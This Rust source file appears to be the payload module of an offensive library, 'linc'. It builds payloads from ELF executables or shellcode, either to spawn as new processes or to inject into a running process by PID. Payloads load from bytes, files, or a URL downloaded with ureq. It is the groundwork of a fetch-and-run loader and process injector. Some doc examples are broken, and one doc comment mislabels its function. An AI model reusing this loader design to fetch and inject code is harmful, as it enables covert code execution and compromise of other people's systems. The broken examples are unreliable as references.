//! Defines types and implementations for creating and configuring executable payloads.
//!
//! This module provides:
//! - `Payload<Spawn>` for creating new processes
//! - `Payload<Inject>` for injecting into existing processes
//!
//! Payloads can be created from:
//! - Files using `from_file()`
//! - Raw bytes using `from_bytes()`
//! - URLs using `from_url()` (requires `http` feature)
//!
//! # Examples
//!
//! Creating a new process:
//! ```no_run
//! use linc::payload::{Spawn, Payload};
//!
//! let payload = Payload::<Spawn>::from_file("/path/to/payload")
//!     .set_args(/* args */);
//!     .unwrap()
//! ```
//!
//! Injecting into an existing process:
//! ```no_run
//! use linc::payload::{Inject, Payload};
//!
//! // Inject into a process with PID 1234
//! let payload = Payload::<Inject>::from_file("/path/to/payload", 1234).unwrap();
//! ```

use std::fs;

use nix::unistd::Pid;

use crate::error::Result;

/// Marker trait that defines valid process states.
/// Currently implemented by `Spawn` and `Inject`.
pub trait ProcessState {}

/// State type representing payloads that spawn new processes.
/// Contains configuration for the spawned process.
pub struct Spawn {
    name: String,
    args: String,
    target: String,
    target_args: String,
}

/// State type representing payloads that inject into existing processes.
/// Contains the target process identifier.
pub struct Inject {
    pid: Pid,
}

// Make sure that ProcessState can be either Spawn or Inject
impl ProcessState for Spawn {}
impl ProcessState for Inject {}

/// A payload that can be used for process injection or creation.
/// The type parameter `S` determines whether this payload creates a new process
/// or injects into an existing one.
///
/// # Type Parameters
/// * `S` - The process state, must implement `ProcessState`. Can be either `Spawn` or `Inject`.
pub struct Payload<S: ProcessState> {
    payload_type: PayloadType,
    bytes: Vec<u8>,
    state: S,
}

/// Specifies the type of payload being used.
#[derive(Debug, Clone, Copy)]
pub enum PayloadType {
    Executable,
    Shellcode,
}

// Constructors
impl Payload<Spawn> {
    /// Creates a spawned payload from raw bytes.
    ///
    /// The bytes can represent either a complete ELF executable or raw shellcode.
    ///
    /// # Parameters
    /// * `bytes` - The raw bytes representing shellcode or an executable
    ///
    /// # Errors
    /// Currently infallible, but returns `Result` for consistency with other constructors.
    ///
    /// # Examples
    ///
    /// ```
    /// use linc::payload::{Payload, Spawn};
    ///
    /// let bytes = vec![/* bytes */];
    /// let payload = Payload::<Spawn>::from_bytes(bytes).unwrap();
    /// ```
    pub fn from_bytes(bytes: Vec<u8>) -> Result<Self> {
        let payload_type = match bytes[..4] {
            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
            _ => PayloadType::Shellcode,
        };

        Ok(Self {
            payload_type,
            bytes,
            state: Spawn {
                name: String::new(),
                args: String::new(),
                target: String::new(),
                target_args: String::new(),
            },
        })
    }

    /// Creates a spawned payload from a file.
    ///
    /// The file can contain either a complete ELF executable or raw shellcode.
    ///
    /// # Parameters
    /// * `path` - Path to the file containing shellcode or an executable.
    ///
    /// # Errors
    /// Returns an error if:
    /// - The file cannot be read.
    /// - The file path contains invalid UTF-8 characters.
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use linc::payload::{Payload, Spawn};
    ///
    /// // Load a payload from a file
    /// let payload = Payload::<Spawn>::from_file("/path/to/payload").unwrap();
    /// ```
    pub fn from_file(path: impl Into<String>) -> Result<Self> {
        let path = path.into();

        let bytes = fs::read(&path)?;
        let payload_type = match bytes[..4] {
            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
            _ => PayloadType::Shellcode,
        };

        Ok(Self {
            payload_type,
            bytes,
            state: Spawn {
                name: path.split('/').last().unwrap_or("").to_string(),
                args: String::new(),
                target: String::new(),
                target_args: String::new(),
            },
        })
    }

    #[cfg(feature = "http")]
    /// Creates a spawned payload by downloading from a URL.
    ///
    /// The downloaded file can be either a complete ELF executable or raw shellcode.
    ///
    /// # Parameters
    ///
    /// * `url` - URL to download the payload from.
    ///
    /// # Errors
    /// Returns an error if:
    /// - The URL is invalid or unreachable.
    /// - The network request fails.
    /// - Reading the response body fails.
    ///
    /// # Examples
    /// ```no_run
    /// use linc::payload::{Payload, Spawn};
    ///
    /// let payload = Payload::<Spawn>::from_url("https://example.com/payload").unwrap();
    /// ```
    pub fn from_url(url: impl Into<String>) -> Result<Self> {
        let url = url.into();

        let response = ureq::get(&url).call()?;

        let mut bytes: Vec<u8> = Vec::new();
        response.into_reader().read_to_end(&mut bytes)?;

        let payload_type = match bytes[..4] {
            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
            _ => PayloadType::Shellcode,
        };

        Ok(Self {
            payload_type,
            bytes,
            state: Spawn {
                name: url.split('/').last().unwrap_or("").to_string(),
                args: String::new(),
                target: String::new(),
                target_args: String::new(),
            },
        })
    }
}

impl Payload<Inject> {
    /// Creates an injected payload from raw bytes.
    ///
    /// # Parameters
    /// * `bytes` - The raw bytes representing shellcode or an executable
    /// * `pid` - Process ID of the target process
    ///
    /// # Examples
    /// ```no_run
    /// use linc::payload::{Inject, Payload};
    ///
    /// let bytes = vec![/* bytes */];
    /// // Inject payload into a process with PID 1234
    /// let payload = Payload::<Inject>::from_bytes(bytes, 1234).unwrap();
    /// ```
    pub fn from_bytes(bytes: Vec<u8>, pid: i32) -> Result<Self> {
        let payload_type = match bytes[..4] {
            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
            _ => PayloadType::Shellcode,
        };

        Ok(Self {
            payload_type,
            bytes,
            state: Inject {
                pid: Pid::from_raw(pid),
            },
        })
    }

    /// Creates an injected payload by reading from a file.
    ///
    /// # Parameters
    /// * `path` - Path to the file containing shellcode or an executable
    /// * `pid` - Process ID of the target process
    ///
    /// # Errors
    /// Returns an error if:
    /// - The file cannot be read.
    /// - The file path contains invalid UTF-8 characters.
    ///
    /// # Examples
    /// ```no_run
    /// use linc::payload::{Inject, Payload};
    ///
    /// // Inject payload into a process with PID 1234
    /// let payload = Payload::<Inject>::from_file("/path/to/payload", 1234).unwrap();
    /// ```
    pub fn from_file(path: impl Into<String>, pid: i32) -> Result<Self> {
        let path = path.into();

        let bytes = fs::read(&path)?;
        let payload_type = match bytes[..4] {
            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
            _ => PayloadType::Shellcode,
        };

        Ok(Self {
            payload_type,
            bytes,
            state: Inject {
                pid: Pid::from_raw(pid),
            },
        })
    }

    /// Creates a Spawn payload by downloading from a URL.
    ///
    /// The downloaded content can be either a complete ELF executable or raw shellcode, as specified by
    /// the `payload_type` parameter.
    ///
    /// # Parameters
    ///
    /// * `url` - URL to download the payload from
    /// * `payload_type` - Specifies whether the download contains an executable or shellcode
    /// * `pid` - Process ID of the target process
    ///
    /// # Errors
    /// Returns an error if:
    /// - The URL is invalid or unreachable
    /// - The network request fails
    /// - Reading the response body fails
    ///
    /// # Examples
    /// ```no_run
    /// use linc::payload::{Inject, Payload};
    ///
    /// // Inject payload into a process with PID 1234
    /// let payload = Payload::<Inject>::from_url("http://example.com/payload", 1234).unwrap();
    /// ```
    #[cfg(feature = "http")]
    pub fn from_url(url: impl Into<String>, pid: i32) -> Result<Self> {
        let url = url.into();

        let response = ureq::get(&url).call()?;

        let mut bytes: Vec<u8> = Vec::new();
        response.into_reader().read_to_end(&mut bytes)?;

        let payload_type = match bytes[..4] {
            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
            _ => PayloadType::Shellcode,
        };

        Ok(Self {
            payload_type,
            bytes,
            state: Inject {
                pid: Pid::from_raw(pid),
            },
        })
    }
}

// Common getters for all states
impl<S: ProcessState> Payload<S> {
    /// Returns the type of this payload.
    pub fn payload_type(&self) -> PayloadType {
        self.payload_type
    }

    /// Returns the payload's raw bytes.
    pub fn bytes(&self) -> &[u8] {
        &self.bytes
    }
}

// Variant-specific getters
impl Payload<Spawn> {
    /// Returns the name of the payload.
    pub fn name(&self) -> &str {
        &self.state.name
    }

    /// Returns the arguments that will be passed to the payload when executed.
    pub fn args(&self) -> &str {
        &self.state.args
    }

    /// Returns the target executable.
    pub fn target(&self) -> &str {
        &self.state.target
    }

    /// Returns the arguments that will be passed to the target executable.
    pub fn target_args(&self) -> &str {
        &self.state.target_args
    }
}

impl Payload<Inject> {
    /// Returns the process ID that this payload will be injected into.
    pub fn pid(&self) -> Pid {
        self.state.pid
    }
}

// Chainable setters
impl Payload<Spawn> {
    /// Sets the arguments for this payload.
    pub fn set_args(mut self, args: &str) -> Self {
        self.state.args = self.state.name.clone() + " " + args;
        self
    }

    /// Sets the target for this payload.
    pub fn set_target(mut self, target: &str) -> Self {
        self.state.target = target.to_string();
        self
    }

    /// Sets the target arguments for this payload.
    pub fn set_target_args(mut self, target_args: &str) -> Self {
        self.state.target_args = self.state.target.clone() + " " + target_args;
        self
    }
}

/// Extension trait for `Result<Payload>` that provides chainable configuration methods.
///
/// This trait allows for payload configuration even when the payload creation
/// might fail. It provides the same configuration methods as `Payload` but works on
/// `Result<Payload>` directly, making it easier to chain operations without explicit
/// error handling.
pub trait PayloadResultExt {
    /// Sets the arguments for the payload.
    ///
    /// # Errors
    /// Returns the original error if the payload creation failed.
    fn set_args(self, args: &str) -> Result<Payload<Spawn>>;

    /// Sets the target executable for the payload.
    ///
    /// # Errors
    /// Returns the original error if the payload creation failed.
    fn set_target(self, target: &str) -> Result<Payload<Spawn>>;

    /// Sets the target executable's arguments for the payload.
    ///
    /// # Errors
    /// Returns the original error if the payload creation failed.
    fn set_target_args(self, target_args: &str) -> Result<Payload<Spawn>>;
}

impl PayloadResultExt for Result<Payload<Spawn>> {
    fn set_args(self, args: &str) -> Result<Payload<Spawn>> {
        self.map(|payload| payload.set_args(args))
    }

    fn set_target(self, target: &str) -> Result<Payload<Spawn>> {
        self.map(|payload| payload.set_target(target))
    }

    fn set_target_args(self, target_args: &str) -> Result<Payload<Spawn>> {
        self.map(|payload| payload.set_target_args(target_args))
    }
}
